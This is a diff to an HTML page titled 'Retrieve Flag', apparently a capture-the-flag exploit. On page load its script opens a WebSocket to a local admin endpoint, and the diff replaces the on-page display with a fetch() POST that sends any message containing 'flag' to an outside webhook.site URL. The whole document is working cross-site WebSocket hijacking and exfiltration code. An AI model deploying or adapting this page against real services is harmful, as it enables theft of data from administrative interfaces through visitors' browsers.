@@ -6,7 +6,6 @@
     <title>Retrieve Flag</title>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            const output = document.getElementById('output');
             const ws = new WebSocket('ws://127.0.0.1/admin/ws'); // Replace <server-address> with the actual server address
 
             ws.onopen = () => {
@@ -17,9 +16,21 @@
             ws.onmessage = (event) => {
                 console.log('Message from server:', event.data);
                 if (event.data.includes('flag')) {
-                    output.textContent = 'Flag: ' + event.data;
-                } else {
-                    output.textContent = 'Response: ' + event.data;
+                    // Send the flag to the specified URL
+                    fetch('https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/flag', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ flag: event.data }),
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Flag sent to webhook:', data);
+                    })
+                    .catch(error => {
+                        console.error('Error sending flag:', error);
+                    });
                 }
                 ws.close();
             };
@@ -30,13 +41,12 @@
 
             ws.onerror = (error) => {
                 console.error('WebSocket error:', error);
-                output.textContent = 'Error: Could not connect to WebSocket.';
             };
         });
     </script>
 </head>
 <body>
     <h1>Retrieve Flag</h1>
-    <p id="output">Connecting...</p>
+    <p>Connecting...</p>
 </body>
 </html>
